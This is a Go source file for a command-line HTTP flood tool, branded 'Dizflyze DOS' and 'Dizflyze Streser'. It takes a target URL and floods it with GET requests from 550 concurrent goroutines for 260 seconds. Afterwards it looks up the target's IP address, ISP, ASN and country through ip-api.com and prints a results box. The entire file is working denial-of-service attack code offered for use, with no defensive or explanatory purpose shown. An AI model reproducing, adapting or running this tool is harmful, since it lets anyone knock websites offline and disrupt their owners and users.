package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	startTime   = time.Now()
	requests    int64
	concurrency = 550
)

const (
	P = "\033[0m"
	R = "\033[31m"
	G = "\033[32m"
	Y = "\033[33m"
	C = "\033[36m"
)

func banner() {
	fmt.Println(P + `
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Dizflyze
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] DOS
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] v1.3.2
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 23 JAN
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
` + P)
}

func getISP(ip string) (string, string, string) {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("http://ip-api.com/json/" + ip)
	if err != nil {
		return "Unknown", "Unknown", "Unknown"
	}
	defer resp.Body.Close()

	var data struct {
		Country string `json:"country"`
		Org     string `json:"org"`
		AS      string `json:"as"`
	}
	json.NewDecoder(resp.Body).Decode(&data)
	return data.Org, data.AS, data.Country
}

func resolveHost(host string) string {
	ips, _ := net.LookupIP(host)
	if len(ips) > 0 {
		return ips[0].String()
	}
	return "Unknown"
}

func attack(url string, client *http.Client, stop <-chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()
	req, _ := http.NewRequest("GET", url, nil)

	for {
		select {
		case <-stop:
			return
		default:
			resp, err := client.Do(req)
			if err == nil {
				resp.Body.Close()
				atomic.AddInt64(&requests, 1)
			}
		}
	}
}

func parseHost(url string) string {
	parts := strings.Split(url, "/")
	if len(parts) >= 3 {
		return parts[2]
	}
	return url
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	banner()
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(P + "╔═[ddos]Dizflyze Streser]\n╚═══➤ " + P)
	url, _ := reader.ReadString('\n')
	url = strings.TrimSpace(url)

	duration := 260 * time.Second
	stop := make(chan struct{})
	var wg sync.WaitGroup

	tr := &http.Transport{
		MaxIdleConns:        65535,
		MaxIdleConnsPerHost: 65535,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
	}
	client := &http.Client{Transport: tr, Timeout: 4 * time.Second}

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go attack(url, client, stop, &wg)
	}

	time.Sleep(duration)
	close(stop)
	wg.Wait()

	host := parseHost(url)
	ip := resolveHost(host)
	isp, asn, country := getISP(ip)

	fmt.Println(R + "\n╔════════════════════════════════════════════════╗" + P)
	fmt.Printf("%s│%s Link     : %s%s\n", R, P, Y, url)
	fmt.Printf("%s│%s Host     : %s%s\n", R, P, Y, host)
	fmt.Printf("%s│%s IP       : %s%s\n", R, P, Y, ip)
	fmt.Printf("%s│%s ISP      : %s%s\n", R, P, C, isp)
	fmt.Printf("%s│%s ASN      : %s%s\n", R, P, C, asn)
	fmt.Printf("%s│%s Country  : %s%s\n", R, P, C, country)
	fmt.Printf("%s│%s Duration : %s%s\n", R, P, Y, time.Since(startTime))
	fmt.Printf("%s│%s Requests : %s%d\n", R, P, G, requests)
	fmt.Println(R + "╚════════════════════════════════════════════════╝" + P)
}
